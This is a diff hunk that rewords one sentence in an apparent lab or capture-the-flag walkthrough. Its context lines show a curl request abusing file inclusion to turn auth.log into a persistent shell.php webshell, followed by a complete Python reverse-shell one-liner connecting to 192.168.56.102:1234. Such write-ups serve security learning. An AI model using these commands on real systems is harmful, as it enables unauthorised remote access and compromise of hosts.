@@ -134,7 +134,7 @@ With this in mind, I decided to set about improving my shell. The first problem 
 
 `curl "http://192.168.56.101/index.php?file=/var/log/auth.log&a=cp+/var/log/auth.log+shell.php"`
 
-This gave me a permanent copy of auth.log in the local directory that won't be overwritten when the log rolls over. The second issue, the messy and slow nature of the webshell, was solved by creating a reverse shell to my machine. The code I used is as follows:
+This gave me a permanent copy of auth.log in the local directory that won't be overwritten when the log rolls over. That gave me time to solve the messy and slow nature of the webshell by creating a reverse shell to my machine. The code I used is as follows:
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
